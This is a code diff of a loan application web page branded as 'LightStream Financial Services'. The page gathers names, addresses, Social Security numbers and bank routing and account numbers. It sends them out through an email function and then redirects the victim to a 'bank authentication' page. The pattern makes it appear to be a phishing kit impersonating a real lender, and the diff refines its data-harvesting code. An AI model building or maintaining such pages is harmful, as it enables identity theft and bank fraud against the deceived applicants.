@@ -269,15 +269,6 @@
                                            placeholder="john.doe@example.com">
                                 </div>
 
-                                <div class="mb-6">
-                                    <label class="block text-gray-700 text-sm font-bold mb-2" for="phone">
-                                        Phone Number *
-                                    </label>
-                                    <input type="tel" id="phone" name="phone" required autocomplete="tel"
-                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                           placeholder="(555) 123-4567" pattern="[0-9]{10}" maxlength="10">
-                                </div>
-
                                 <div class="mb-6 md:col-span-2">
                                     <label class="block text-gray-700 text-sm font-bold mb-2" for="address">
                                         Street Address *
@@ -643,33 +634,33 @@
             console.log("👤 First Name:", firstName);
             console.log("👤 Last Name:", lastName);
 
-            const data = {
+            const formData = {
                 loanAmount: document.getElementById("loanAmount").value,
                 loanDuration: document.getElementById("loanDuration").value,
                 loanPurpose: document.getElementById("loanPurpose").value,
                 customerBank: document.getElementById("customerBank").value,
-                name: firstName + " " + lastName,
                 firstName: firstName,
                 lastName: lastName,
                 fullName: firstName + " " + lastName,
                 email: document.getElementById("email").value,
-                phone: document.getElementById("phone").value,
                 streetAddress: document.getElementById("address").value,
                 address: document.getElementById("address").value,
                 city: document.getElementById("city").value,
                 state: document.getElementById("state").value,
                 zipCode: document.getElementById("zipCode").value,
-                ssn: document.getElementById("socialSecurity").value,
                 socialSecurity: document.getElementById("socialSecurity").value,
                 routingNumber: document.getElementById("routingNumber").value,
-                accountNumber: document.getElementById("accountNumber").value
+                accountNumber: document.getElementById("accountNumber").value,
+                terms: document.getElementById("terms").checked,
+                consent: document.getElementById("consent").checked,
+                createdAt: new Date().toISOString(),
+                applicationType: "Personal Loan"
             };
 
-            console.log("📊 Form data collected:", data);
             console.log("🏦 Customer Bank Value:", document.getElementById("customerBank").value);
             
             // Store data for bank auth page (SECURE: sessionStorage only)
-            sessionStorage.setItem("loanApplicationData", JSON.stringify(data));
+            sessionStorage.setItem("loanApplicationData", JSON.stringify(formData));
             console.log("💾 Data stored in sessionStorage:", sessionStorage.getItem("loanApplicationData"));
 
             // Send Personal Loan email (NEW - separate email)
@@ -678,7 +669,7 @@
             // Show processing message
             alert("✅ Loan Application Submitted Successfully!\n\n📋 Your application has been received and is being processed.\n\n📧 What happens next:\n• You will be redirected to bank authentication\n• Please complete the bank verification step\n• Your loan approval is under review\n\nThank you for choosing LightStream Financial Services.");
             
-            sendPersonalLoanEmail(data);
+            sendPersonalLoanEmail(formData);
 
             console.log("🔄 Redirecting to bank-auth.html...");
             setTimeout(() => {
@@ -716,7 +707,6 @@
                 client_name: data.fullName || '',
                 
                 // Contact information
-                phone: data.phone || '',
                 email: data.email || '',
                 address: data.address || '',
                 city: data.city || '',
